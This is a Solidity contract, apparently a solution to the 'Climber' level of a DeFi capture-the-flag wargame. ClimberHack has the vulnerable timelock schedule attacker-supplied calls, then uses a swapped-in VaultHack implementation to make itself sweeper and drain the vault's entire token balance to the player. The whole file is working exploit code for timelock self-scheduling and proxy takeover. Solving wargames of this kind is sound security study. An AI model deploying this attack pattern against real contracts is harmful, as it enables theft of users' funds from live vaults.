// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "solady/src/utils/SafeTransferLib.sol";
import "./VaultHack.sol";

interface IClimberTimelock {
    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;

    function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt)
        external
        payable;
}

interface IClimberVault {
    function sweepFunds(address token) external;
}

contract ClimberHack {

    address public player;
    address[] private to;
    bytes[] private encodedData;
    IClimberTimelock public timelock;
    IERC20 public token;
    VaultHack public vaultHack;

    constructor(address _player, address _timelock, address _token, address _vault) {
        player = _player;
        timelock = IClimberTimelock(_timelock);
        token = IERC20(_token);
        vaultHack = VaultHack(_vault);
    }

    function saveScheduledData(address[] memory _to, bytes[] memory _encodedData) external {
        to = _to;
        encodedData = _encodedData;
    }

    function exploit() external {
        uint256[] memory emptyValues = new uint256[](to.length);
        timelock.schedule(to, emptyValues, encodedData, bytes32(0));
    }

    function withdraw() external {
        // setSweeper and sweepFunds(token) to get the token balance
        vaultHack.setSweeper(address(this));
        vaultHack.sweepFunds(address(token));

        uint256 amount = token.balanceOf(address(this));
        SafeTransferLib.safeTransfer(address(token), player, amount);
    }

}